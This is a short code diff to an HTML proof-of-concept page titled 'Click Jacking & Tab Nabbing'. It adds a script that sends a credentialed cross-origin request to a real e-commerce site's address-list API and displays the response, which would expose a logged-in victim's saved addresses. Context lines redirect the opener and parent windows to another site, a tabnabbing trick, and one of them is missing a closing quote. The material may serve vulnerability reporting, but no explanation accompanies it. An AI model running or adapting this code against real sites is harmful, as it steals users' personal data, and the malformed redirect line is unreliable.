@@ -23,6 +23,21 @@ document.addEventListener('DOMContentLoaded', function () {
         if (window.opener) window.opener.parent.location.replace('http://mui.or.id);
 if (window.parent != window) window.parent.location.replace('http://mui.or.id');
         </script>
+        
+        <script>
+          function cors() {
+              var xhttp = new XMLHttpRequest();
+               xhttp.onreadystatechange = function() {
+                   if (this.readyState == 4 && this.status == 200) {
+                       document.getElementById("demo").innerHTML  = alert(this.responseText);
+                   }
+               };
+              xhttp.open("GET", "https://www.lazada.co.id/address/api/listAddress", true);
+              xhttp.withCredentials = true;
+              xhttp.send();
+             }
+        </script>
+        
     </head>
     <body>
  <center><h1>Click Jacking & Tab Nabbing</h1></center>
